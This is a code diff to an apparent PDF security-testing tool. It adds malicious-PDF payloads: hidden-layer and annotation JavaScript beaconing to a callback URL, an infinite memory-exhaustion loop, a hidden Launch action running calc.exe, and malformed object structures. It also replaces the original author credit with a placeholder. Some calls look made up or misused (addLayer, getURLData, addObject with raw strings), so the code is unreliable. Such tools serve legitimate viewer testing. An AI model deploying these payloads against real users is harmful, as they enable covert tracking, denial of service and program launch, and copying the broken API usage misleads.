@@ -35,7 +35,8 @@ Supported PDF Viewers and Expected Behaviors:
 - Chrome PDF Viewer: Content rendering only
 - Microsoft Edge PDF Viewer: Content rendering only
 
-Author: nullenc0de
+Author: [Your Name]
+License: [License Info]
 """
 
 import os
@@ -812,6 +813,194 @@ class PDFSecurityTester:
                     self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                     self._record_payload_execution(payload, False, str(e))
 
+    def add_advanced_javascript_payloads(self, writer: PdfWriter) -> None:
+        """Add advanced JavaScript execution tests"""
+        js_payloads = [
+            TestPayload(
+                name="Hidden Layer JavaScript",
+                content=f"""
+                    var layer = this.addLayer("HiddenLayer");
+                    layer.enabled = false;
+                    layer.onClick = function() {{
+                        app.launchURL("{self.callback_url}/layer/{self.test_id}");
+                    }};
+                """,
+                category=PayloadCategory.JAVASCRIPT,
+                description="Tests JavaScript execution in hidden layers",
+                viewer_requirements=["Adobe Acrobat"],
+                expected_outcome="May execute JavaScript when layer is toggled",
+                severity="High",
+                mitigation="Disable JavaScript in layers"
+            ),
+            TestPayload(
+                name="Resource Exhaustion",
+                content="""
+                    var arr = [];
+                    while(true) {
+                        arr.push(new Array(1000000).join('A'));
+                    }
+                """,
+                category=PayloadCategory.JAVASCRIPT,
+                description="Tests memory exhaustion protection",
+                viewer_requirements=["PDF processors with JavaScript"],
+                expected_outcome="Should be prevented by memory limits",
+                severity="High",
+                mitigation="Implement JavaScript resource limits"
+            ),
+            TestPayload(
+                name="DOM-Based XSS",
+                content=f"""
+                    var url = app.media.getURLData();
+                    var decoded = decodeURIComponent(url);
+                    app.alert(decoded);
+                    app.launchURL("{self.callback_url}/xss/dom/" + decoded);
+                """,
+                category=PayloadCategory.XSS,
+                description="Tests DOM-based XSS in PDF viewers",
+                viewer_requirements=["PDF viewers with DOM access"],
+                expected_outcome="May execute XSS via URL parameters",
+                severity="High",
+                mitigation="Sanitize URL parameters"
+            )
+        ]
+        
+        for payload in js_payloads:
+            if self._should_include_payload(payload):
+                try:
+                    writer.add_js(payload.content)
+                    self._record_payload_execution(payload, True)
+                except Exception as e:
+                    self.logger.error(f"Failed to add advanced JS payload {payload.name}: {str(e)}")
+                    self._record_payload_execution(payload, False, str(e))
+
+    def add_resource_exhaustion_tests(self, writer: PdfWriter) -> None:
+        """Add tests for resource exhaustion vulnerabilities"""
+        # Create a PDF with extremely large dimensions
+        large_page = writer.add_blank_page(width=100000, height=100000)
+        
+        # Add a massive number of small objects
+        for i in range(1000):
+            writer.add_object(f"% Comment {i}\n" * 1000)
+        
+        # Add deeply nested dictionaries
+        nested_dict = "<<\n"
+        for i in range(1000):
+            nested_dict += f"/Key{i} <<\n"
+        nested_dict += ">>" * 1000
+        writer.add_object(nested_dict)
+
+    def add_malformed_structure_payloads(self, writer: PdfWriter) -> None:
+        """Add tests for malformed PDF structures"""
+        structure_payloads = [
+            TestPayload(
+                name="Overlapping Objects",
+                content="""
+                1 0 obj
+                <<>>
+                endobj
+                1 0 obj
+                <<>>
+                endobj
+                """,
+                category=PayloadCategory.PDF_STRUCTURE,
+                description="Tests handling of overlapping object numbers",
+                viewer_requirements=["Any PDF processor"],
+                expected_outcome="Should detect and reject duplicate objects",
+                severity="High",
+                mitigation="Validate object numbering"
+            ),
+            TestPayload(
+                name="Circular References",
+                content="""
+                1 0 obj
+                <<
+                    /Type /Pages
+                    /Kids [2 0 R]
+                >>
+                endobj
+                2 0 obj
+                <<
+                    /Parent 1 0 R
+                    /Kids [1 0 R]
+                >>
+                endobj
+                """,
+                category=PayloadCategory.PDF_STRUCTURE,
+                description="Tests handling of circular object references",
+                viewer_requirements=["Any PDF processor"],
+                expected_outcome="Should detect circular references",
+                severity="High",
+                mitigation="Check for circular references"
+            )
+        ]
+        
+        for payload in structure_payloads:
+            if self._should_include_payload(payload):
+                try:
+                    writer.addObject(payload.content)
+                    self._record_payload_execution(payload, True)
+                except Exception as e:
+                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
+                    self._record_payload_execution(payload, False, str(e))
+
+    def add_advanced_annotation_payloads(self, writer: PdfWriter) -> None:
+        """Add advanced annotation-based test payloads"""
+        annotation_payloads = [
+            TestPayload(
+                name="Hidden Launch Action",
+                content=f"""
+                <<
+                    /Type /Annot
+                    /Subtype /Link
+                    /Rect [0 0 0 0]
+                    /F 2
+                    /A <<
+                        /Type /Action
+                        /S /Launch
+                        /F (calc.exe)
+                    >>
+                >>
+                """,
+                category=PayloadCategory.ANNOTATIONS,
+                description="Tests hidden annotations with launch actions",
+                viewer_requirements=["Adobe Acrobat"],
+                expected_outcome="Should block launch actions",
+                severity="Critical",
+                mitigation="Disable launch actions"
+            ),
+            TestPayload(
+                name="Dynamic Annotation",
+                content=f"""
+                <<
+                    /Type /Annot
+                    /Subtype /Widget
+                    /FT /Tx
+                    /AA <<
+                        /K <<
+                            /S /JavaScript
+                            /JS (app.launchURL("{self.callback_url}/annot/dynamic/{self.test_id}");)
+                        >>
+                    >>
+                >>
+                """,
+                category=PayloadCategory.ANNOTATIONS,
+                description="Tests dynamic annotation behaviors",
+                viewer_requirements=["PDF viewers with annotation support"],
+                expected_outcome="May execute JavaScript on interaction",
+                severity="High",
+                mitigation="Disable annotation scripts"
+            )
+        ]
+        
+        for payload in annotation_payloads:
+            if self._should_include_payload(payload):
+                try:
+                    writer.addObject(payload.content)
+                    self._record_payload_execution(payload, True)
+                except Exception as e:
+                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
+                    self._record_payload_execution(payload, False, str(e))
+
     def create_security_test_pdf(self, output_path: str) -> None:
         """
         Create a PDF with security test payloads
@@ -824,28 +1013,27 @@ class PDFSecurityTester:
         failed_payloads = 0
         
         try:
-            # Original payloads
-            for method in [
+            # Add basic tests
+            test_methods = [
                 self.add_metadata_payloads,
                 self.add_javascript_payloads,
-                self._add_test_pages
-            ]:
-                try:
-                    method(writer)
-                    successful_payloads += 1
-                except Exception as e:
-                    self.logger.error(f"Error in {method.__name__}: {str(e)}")
-                    failed_payloads += 1
-            
-            # New test categories
-            for method in [
+                self._add_test_pages,
                 self.add_embedded_file_payloads,
                 self.add_signature_payloads,
                 self.add_structure_payloads,
                 self.add_font_payloads,
                 self.add_form_payloads,
-                self.add_annotation_payloads
-            ]:
+                self.add_annotation_payloads,
+                # New advanced tests
+                self.add_advanced_javascript_payloads,
+                self.add_advanced_annotation_payloads,
+                self.add_malformed_structure_payloads
+            ]
+            
+            # Add resource exhaustion tests last to avoid interfering with other tests
+            test_methods.append(self.add_resource_exhaustion_tests)
+            
+            for method in test_methods:
                 try:
                     method(writer)
                     successful_payloads += 1
